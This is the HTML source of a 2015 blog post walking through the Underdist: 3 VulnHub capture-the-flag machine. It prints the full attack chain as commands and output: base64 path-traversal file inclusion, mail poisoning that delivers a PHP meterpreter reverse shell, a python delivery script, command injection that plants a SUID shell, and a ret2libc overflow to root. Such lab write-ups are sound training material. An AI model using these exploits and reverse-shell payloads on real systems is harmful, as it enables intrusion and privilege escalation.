@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Underdist: 3 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-01-03">January 03, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/underdist">underdist</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Underdist: 3</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Underdist: 3 was a weekend challenge being run by the <a href="http://underc0de.org">Underc0de</a> group.  I didn&rsquo;t take part in the event, but the VM found its way onto <a href="https://www.vulnhub.com/entry/underdist-3,108/">VulnHub</a>.  On a quiet Saturday evening, I thought I&rsquo;d give it a go (because that&rsquo;s how rock-n-roll I am).</p>
+
+<h2 id="nmap:69270f6e9a12eebdce6e7f610e03857c">Nmap</h2>
+
+<pre><code class="language-text">rasta@mouse:~$ sudo nmap -n -sS -A -p- 192.168.56.103
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 a9:b1:ec:a1:b4:14:e9:56:0d:ff:b4:63:75:b4:a3:2c (DSA)
+|   2048 5e:ab:cd:93:1c:cb:16:86:71:2e:b3:b1:1f:57:c9:03 (RSA)
+|_  256 bb:87:6c:13:30:5b:22:19:65:5e:ca:f9:e9:4f:bb:0b (ECDSA)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: Underdist, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+| ssl-cert: Subject: commonName=Underdist
+| Not valid before: 2014-10-21T23:27:03+00:00
+|_Not valid after:  2024-10-18T23:27:03+00:00
+|_ssl-date: 2015-01-03T14:58:07+00:00; -2s from local time.
+80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+</code></pre>
+
+<p>The SSH service was out straight away, as only keys can be used to login.</p>
+
+<pre><code class="language-text">rasta@mouse:~$ ssh 192.168.56.102
+Permission denied (publickey).
+</code></pre>
+
+<h2 id="local-file-inclusion:69270f6e9a12eebdce6e7f610e03857c">Local File Inclusion</h2>
+
+<p>Browsing to port 80, you see some cool ASCII art.</p>
+
+<pre><code class="language-text">__  __              __                   __               __                        __         __    
+/\ \/\ \            /\ \                 /\ \  __         /\ \__                   /'__`\     /'__`\  
+\ \ \ \ \    ___    \_\ \     __   _ __  \_\ \/\_\    ____\ \ ,_\                 /\_\L\ \   /\ \/\ \ 
+\ \ \ \ \ /' _ `\  /'_` \  /'__`\/\`'__\/'_` \/\ \  /',__\\ \ \/       _______   \/_/_\_&lt;_  \ \ \ \ \
+  \ \ \_\ \/\ \/\ \/\ \L\ \/\  __/\ \ \//\ \L\ \ \ \/\__, `\\ \ \_     /\______\    /\ \L\ \__\ \ \_\ \
+   \ \_____\ \_\ \_\ \___,_\ \____\\ \_\\ \___,_\ \_\/\____/ \ \__\    \/______/    \ \____/\_\\ \____/
+    \/_____/\/_/\/_/\/__,_ /\/____/ \/_/ \/__,_ /\/_/\/___/   \/__/                  \/___/\/_/ \/___/
+</code></pre>
+
+<p>But looking at the source code, you find the comment: <code>&lt;!--&lt;a href=&quot;v.php?a=YXNjaWkxLnR4dA==&quot;&gt;foo&lt;/a&gt;--&gt;</code></p>
+
+<p>If you browse to that URL, you see some 404 ASCII art.</p>
+
+<pre><code class="language-text">   _____  _______      _____ 
+  /  |  | \   _  \    /  |  |
+/   |  |_/  /_\  \  /   |  |_
+/    ^   /\  \_/   \/    ^   /
+\____   |  \_____  /\____   |
+     |__|        \/      |__|
+
+    
+               NOT FOUND.
+</code></pre>
+
+<p>The string <code>YXNjaWkxLnR4dA==</code> looks very much like an encoded string, most likely base64.  You can decode this:</p>
+
+<pre><code class="language-text">rasta@mouse:~$ echo -en 'YXNjaWkxLnR4dA==' | base64 -d
+ascii1.txt
+</code></pre>
+
+<p>This suggests that <code>v.php</code> is including the file <code>ascii1.txt</code>, maybe we can force it to include other files too?</p>
+
+<pre><code class="language-text">rasta@mouse:~$ echo -en '../../../../etc/passwd' | base64
+Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+rasta@mouse:~$ curl http://192.168.56.103/v.php?a=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:104::/var/spool/exim4:/bin/false
+dovecot:x:102:106:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:103:65534:Dovecot login user,,,:/nonexistent:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+debian-spamd:x:105:107::/var/lib/spamassassin:/bin/sh
+underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash
+postfix:x:106:109::/var/spool/postfix:/bin/false
+cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash
+smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+</code></pre>
+
+<p>The next stage is to leverage this LFI to read more files on the system, looking for a way in.  It&rsquo;s a little bit cumbersome to manually encode the filename and then cURL it; so I wrote an <code>LFIshell</code> script to automate it.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+if [ &quot;$#&quot; -lt 1 ]; then
+        echo &quot;Usage: $0 file&quot;
+        exit 1
+fi
+
+curl='/usr/bin/curl'
+url='http://192.168.56.103'
+lfi='v.php?a='
+file=`echo -en ../../../..$1|/usr/bin/base64`
+
+curl $url/$lfi$file
+</code></pre>
+
+<p>My plan was to poison the apache access/error logs with PHP code, that I would be able to execute via the LFI.  However, they are not readable by the www-data user.</p>
+
+<p>I eventually turned my attention to the SMTP service.  I took a list of users from <code>/etc/passwd</code>, <code>cut -d ':' -f1 &gt;&gt; users</code> and tried to enumerate valid users.</p>
+
+<pre><code class="language-text">rasta@mouse:~/vulnhub/underdist-3$ smtp-user-enum -t 192.168.56.102 -U users
+</code></pre>
+
+<p>Every user came back as being valid, including <code>www-data</code>.  I found I was able to email the <code>www-data</code> user and read the content back via the LFI.</p>
+
+<pre><code class="language-text">rasta@mouse:~$ nc 192.168.56.102 25
+220 Underdist ESMTP Postfix (Debian/GNU)
+HELO underdist
+250 Underdist
+MAIL from:rasta
+250 2.1.0 Ok
+RCPT to:www-data
+250 2.1.5 Ok
+data
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+this is a test!
+.
+250 2.0.0 Ok: queued as 3B91F8535
+</code></pre>
+
+<pre><code class="language-text">rasta@mouse:~/vulnhub/underdist-3$ ./LFIshell.sh /var/mail/www-data
+
+From rasta@home.lan  Sat Jan  3 14:42:01 2015
+Return-Path: &lt;rasta@home.lan&gt;
+X-Original-To: www-data
+Delivered-To: www-data@home.lan
+Received: from underdist (unknown [192.168.56.101])
+     by Underdist (Postfix) with SMTP id 3B91F8535
+     for &lt;www-data&gt;; Sat,  3 Jan 2015 14:41:46 -0300 (ART)
+
+this is a test!
+</code></pre>
+
+<h2 id="php-shell:69270f6e9a12eebdce6e7f610e03857c">PHP Shell</h2>
+
+<p>I was now able to email <code>www-data</code> with PHP reverse shellcode and execute with the LFI.</p>
+
+<pre><code class="language-text">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw | base64 | tr -d '\n'
+</code></pre>
+
+<p>I wrote the exploit into a python script to automate the deployment.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import socket
+
+target = '192.168.56.103'
+port = 25
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+payload = &quot;&lt;?php eval(base64_decode('Izw/[...snip...]KTsK')); ?&gt;&quot;
+
+s.send('HELO underdist\r\n')
+s.send('MAIL from:rasta\r\n')
+s.send('RCPT to:www-data\r\n')
+s.send('data\r\n')
+s.send(payload + '\r\n.\r\n')
+</code></pre>
+
+<pre><code class="language-text">rasta@mouse:~$ sudo msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 E
+
+[*] Started reverse handler on 192.168.56.101:4444
+[*] Starting the payload handler...
+</code></pre>
+
+<pre><code class="language-text">rasta@mouse:~/vulnhub/underdist-3$ ./LFIshell.sh /var/mail/www-data
+</code></pre>
+
+<pre><code class="language-text">[*] Sending stage (40551 bytes) to 192.168.56.103
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&gt; 192.168.56.103:34683) at 2015-01-03 19:55:28 +0000
+
+meterpreter &gt; sysinfo
+Computer    : Underdist
+OS          : Linux Underdist 3.2.0-4-486 #1 Debian 3.2.63-2 i686
+Meterpreter : php/php
+</code></pre>
+
+<h2 id="private-key:69270f6e9a12eebdce6e7f610e03857c">Private Key</h2>
+
+<p>Now that I had a shell on the system, I could browse the filesystem properly and straight away, I found a funny directory.</p>
+
+<pre><code class="language-text">meterpreter &gt; pwd
+/var/www
+meterpreter &gt; ls
+
+Listing: /var/www
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40755/rwxr-xr-x   4096  dir   2001-12-31 11:21:16 +0000  ascii
+40755/rwxr-xr-x   4096  dir   2001-12-31 12:17:57 +0000  b_gd214dg
+100644/rw-r--r--  1254  fil   2001-12-31 11:35:36 +0000  index.html
+100644/rw-r--r--  282   fil   2001-12-31 11:36:49 +0000  v.php
+
+meterpreter &gt; ls b_gd214dg
+
+Listing: b_gd214dg
+==================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  1675  fil   2001-12-31 12:17:18 +0000  foo.backup
+
+</code></pre>
+
+<p>The Meterpreter shell wasn&rsquo;t fully functional, I couldn&rsquo;t drop into a shell or download <code>foo.backup</code>.  But since it&rsquo;s available via apache, I used <code>wget</code>.</p>
+
+<p>This file turned out to be a private SSH key, which I was able to use with <code>cuervo</code>.</p>
+
+<pre><code class="language-text">rasta@mouse:~/vulnhub/underdist-3$ wget http://192.168.56.103/b_gd214dg/foo.backup -O foo.backup
+
+rasta@mouse:~/vulnhub/underdist-3$ file foo.backup
+foo.backup: PEM RSA private key
+
+rasta@mouse:~/vulnhub/underdist-3$ chmod 400 foo.backup 
+rasta@mouse:~/vulnhub/underdist-3$ ssh cuervo@192.168.56.103 -i foo.backup
+
+cuervo@Underdist:~$
+</code></pre>
+
+<h2 id="cronping:69270f6e9a12eebdce6e7f610e03857c">Cronping</h2>
+
+<p><code>underdist's</code> home directory is (partially) readable.</p>
+
+<pre><code class="language-text">cuervo@Underdist:~$ ls -l /home
+drwx------ 3 cuervo    cuervo    4096 oct 27 12:56 cuervo
+drwxr-xr-x 4 underdist underdist 4096 oct 27 11:55 underdist
+
+cuervo@Underdist:~$ ls -l /home/underdist/
+-rwxr-xr-x 1 underdist underdist 541 oct 27 11:46 cronping.py
+-rwxrwxrwx 1 underdist underdist  80 oct 27 13:12 ips.txt
+</code></pre>
+
+<p>From the filename, we can infer that <code>cronping.py</code> is periodically executed via a cronjob.  Because of the poor file permissions of the files, we can read them both and even modify <code>ips.txt</code>.</p>
+
+<p>Reviewing <code>cronping.py</code>, I saw that it reads in a list of IP address from <code>ips.txt</code> and passes them into the <code>popen</code> python function to ping the addresses.</p>
+
+<p><code>p=os.popen('ping -c 1 -w 1 %s|grep received|cut -d &quot; &quot; -f 4' % (c), &quot;r&quot;)</code></p>
+
+<p>None of the input is sanitised, so <code>ips.txt</code> can be modified to include arbitrary code exection in <code>popen</code>.</p>
+
+<p>I wrote <code>127.0.0.1;cp /bin/sh /tmp/sh; chmod 4777 /tmp/sh</code> into <code>ips.txt</code>, sat back and&hellip;</p>
+
+<pre><code class="language-text">cuervo@Underdist:/home/underdist$ ls -l /tmp/
+-rwsrwxrwx 1 underdist underdist 97284 ene  3 17:08 sh
+
+cuervo@Underdist:/home/underdist$ /tmp/sh
+$ whoami
+underdist
+</code></pre>
+
+<p>I created <code>.ssh/authorzed_keys</code> with my public key in <code>underdist's</code> home directory for SSH access.</p>
+
+<h2 id="echo:69270f6e9a12eebdce6e7f610e03857c">Echo</h2>
+
+<p>Also within <code>/home/underdist</code> is a &lsquo;hidden&rsquo; directory which can only be accessed by <code>underdist</code>.</p>
+
+<pre><code class="language-text">drwx------ 2 underdist underdist 4096 oct 27 12:56 .bin
+</code></pre>
+
+<p>Within which, is a SUID binary owned by root.</p>
+
+<pre><code class="language-text">-rwsr-xr-x 1 root      root      4986 oct 27 12:56 echo
+</code></pre>
+
+<pre><code class="language-text">underdist@Underdist:~/.bin$ ./echo test
+test
+</code></pre>
+
+<p>Running the binary through <code>strings</code> shows that <code>strcpy</code> is being used.  Maybe we can find an overflow to exploit&hellip;</p>
+
+<pre><code class="language-text">underdist@Underdist:~/.bin$ ./echo $(python -c 'print (&quot;A&quot; * 500)')
+AAAA[...snip...]AAAA
+Violación de segmento
+</code></pre>
+
+<p>My Spanish isn&rsquo;t too good, but think I understand that the binary segfaults :) and I confirmed that I could overwrite EIP.</p>
+
+<pre><code class="language-text">(gdb) r $(python -c 'print (&quot;A&quot; * 500)')
+Starting program: /home/underdist/.bin/echo $(python -c 'print (&quot;A&quot; * 500)')
+AAAA[...snip...]AAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+</code></pre>
+
+<p>There is next to no protection on the box or binary.</p>
+
+<pre><code class="language-text">underdist@Underdist:~/.bin$ cat /proc/sys/kernel/randomize_va_space
+0
+
+underdist@Underdist:~/.bin$ ./checksec.sh --file echo
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   echo
+</code></pre>
+
+<h2 id="ret2libc:69270f6e9a12eebdce6e7f610e03857c">ret2libc</h2>
+
+<p>Even though there&rsquo;s no NX (allowing one to include shellcode directly in the exploit), I find the ret2libc technique easier and quicker to get working.</p>
+
+<p>First, determine the offset to overwrite EIP.</p>
+
+<pre><code class="language-text">0x6b41316b
+[*] Exact match at offset 304
+
+(gdb) r $(python -c 'print (&quot;A&quot; * 304 + &quot;B&quot; * 4)')
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+</code></pre>
+
+<pre><code class="language-text">$1 = {&lt;text variable, no debug info&gt;} 0xb7ec56b0 &lt;system&gt;
+$2 = {&lt;text variable, no debug info&gt;} 0xb7eb8f80 &lt;exit&gt;
+</code></pre>
+
+<p>The structure of my exploit shall be: <code>Padding + system() + exit() + /bin/sh</code></p>
+
+<p>For the padding, I&rsquo;ll use <code>NOPs</code> (304 to write up to EIP) and <code>EIP</code> will be overwritten with the address for <code>system()</code>.  System() needs two arguments: an <code>exit</code> address (you don&rsquo;t need a real address for this, you can just fill it with junk) and an address which contains the string of whatever you want to execute (I want <code>/bin/sh</code>).</p>
+
+<p>I&rsquo;ll put the string <code>/bin/sh</code> into an environmental variable and obtain it&rsquo;s address in memory using this C program.</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char *argv[])
+{
+	if(!argv[1])
+		exit(1);
+	printf(&quot;%#x\n&quot;, getenv(argv[1]));
+	return 0;
+}
+</code></pre>
+
+<pre><code class="language-text">underdist@Underdist:~/.bin$ export binsh=/bin/sh
+underdist@Underdist:~/.bin$ ./addr binsh
+0xbffff954
+</code></pre>
+
+<p>Now I can piece my exploit together.</p>
+
+<pre><code class="language-text">underdist@Underdist:~/.bin$ ./echo $(python -c 'print (&quot;\x90&quot; * 304) + &quot;\xb0\x56\xec\xb7&quot; + &quot;\x80\x8f\xeb\xb7&quot; + &quot;\x54\xf9\xff\xbf&quot;')
+# id; whoami
+uid=1000(underdist) gid=1000(underdist) euid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(underdist)
+root
+</code></pre>
+
+<h2 id="flag:69270f6e9a12eebdce6e7f610e03857c">Flag</h2>
+
+<pre><code class="language-text">
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+              
+               http://underc0de.org
+    
+
+
+Felicidades H4x0r! resolviste el reto!
+
+Mandame tu solucionario a: a.denegado@gmail.com
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
